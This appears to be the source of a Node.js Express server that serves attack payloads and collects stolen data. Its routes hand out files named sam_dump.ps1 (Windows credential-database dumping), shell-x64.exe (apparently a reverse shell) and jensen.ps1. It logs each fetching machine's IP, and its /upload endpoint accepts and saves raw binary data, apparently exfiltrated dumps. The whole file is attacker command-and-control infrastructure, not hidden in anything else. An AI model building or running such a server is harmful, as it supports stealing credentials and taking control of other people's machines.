const fs = require("fs");
const path = require("path");
const morgan = require("morgan");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const port = 3000;

// Middleware to extract client IP
app.use((req, res, next) => {
  req.clientIp = req.ip.split("::ffff:").pop();
  next();
});

// Define a custom format for morgan
morgan.format("custom", "A machine is accessing your webserver.\nIt has the IP: :client-ip");

// Use the custom format in the logging middleware
app.use(morgan("custom", { immediate: true }));

// Define a custom token for morgan to log only the IP address
morgan.token("client-ip", function (req, res) {
  return req.clientIp;
});

// Set up body parser middleware to handle binary data
app.use(bodyParser.raw({ type: "application/octet-stream" }));

app.get("/sam_dump.ps1", (req, res) => {
  console.log(`IP: ${req.clientIp}, Requested file: ${req.path}`);
  res.sendFile("./sam_dump.ps1", { root: __dirname });
});

app.get("/shell-x64.exe", (req, res) => {
  console.log(`IP: ${req.clientIp}, Requested file: ${req.path}`);
  res.sendFile("./shell-x64.exe", { root: __dirname });
});

app.get("/jensen.ps1", (req, res) => {
  console.log(`IP: ${req.clientIp}, Requested file: ${req.path}`);
  res.sendFile("./jensen.ps1", { root: __dirname });
});

// Route for handling file upload
app.post("/upload", (req, res) => {
  try {
    const buffers = [];

    // Listen for incoming data chunks
    req.on("data", (chunk) => {
      buffers.push(chunk);
    });

    // When all data has been received
    req.on("end", () => {
      // Concatenate all data chunks into a single Buffer
      const data = Buffer.concat(buffers);

      // Generate a unique filename based on timestamp
      const timestamp = Date.now();
      const file = path.join(__dirname, `uploads_${timestamp}`);

      // Write the received binary data to a file
      fs.writeFile(file, data, (err) => {
        if (err) {
          console.error("Error saving uploaded file:", err);
          res.status(500).send("Internal Server Error");
        } else {
          console.log("File saved successfully");
          res.status(200).send("200");
        }
      });
    });
  } catch (error) {
    console.error("Error handling upload:", error);
    res.status(400).send("Bad Request");
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is listening on port ${port}`);
});
